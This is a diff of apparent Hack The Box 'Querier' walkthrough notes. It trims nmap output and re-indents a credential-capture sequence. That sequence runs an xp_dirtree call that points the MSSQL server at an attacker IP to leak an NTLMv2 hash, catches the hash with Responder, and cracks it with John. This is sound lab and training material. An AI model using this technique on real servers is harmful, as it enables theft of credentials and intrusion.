@@ -33,24 +33,6 @@ https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-s
     |     DNS_Tree_Name: HTB.LOCAL
     |_    Product_Version: 10.0.17763
 
-    Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
-
-        Host script results:
-        | smb2-time: 
-        |   date: 2024-02-06T00:16:51
-        |_  start_date: N/A
-        |_clock-skew: mean: -15s, deviation: 0s, median: -15s
-        | smb2-security-mode: 
-        |   3:1:1: 
-        |_    Message signing enabled but not required
-        | p2p-conficker: 
-        |   Checking for Conficker.C or higher...
-        |   Check 1 (port 10624/tcp): CLEAN (Couldn't connect)
-        |   Check 2 (port 25203/tcp): CLEAN (Couldn't connect)
-        |   Check 3 (port 40571/udp): CLEAN (Timeout)
-        |   Check 4 (port 10812/udp): CLEAN (Failed to receive data)
-        |_  0/4 checks are positive: Host is CLEAN or ports are blocked
-
 
 
     Enumeration SMB server:
@@ -116,13 +98,13 @@ https://medium.com/@markmotig/how-to-capture-mssql-credentials-with-xp-dirtree-s
                 because we are in 'master' table we will use:
                     exec master.dbo.xp_dirtree '\\<attacker_IP>\any\thing'
         
-        Now we can colect the NTLM Hash in responder:
-            SMB] NTLMv2-SSP Client   : 10.10.10.125
-            [SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
-            [SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:xxxxxxxxxxxx   
+                Now we can colect the NTLM Hash in responder:
+                    SMB] NTLMv2-SSP Client   : 10.10.10.125
+                    [SMB] NTLMv2-SSP Username : QUERIER\mssql-svc
+                    [SMB] NTLMv2-SSP Hash     : mssql-svc::QUERIER:xxxxxxxxxxxx   
 
-        We use John for NTLMv2:
-            john NTLM.hash --wordlist=/usr/share/wordlists/rockyou.txt 
+                We use John for NTLMv2:
+                    john NTLM.hash --wordlist=/usr/share/wordlists/rockyou.txt 
 
 
         We will test MSSQL connection with new creds:
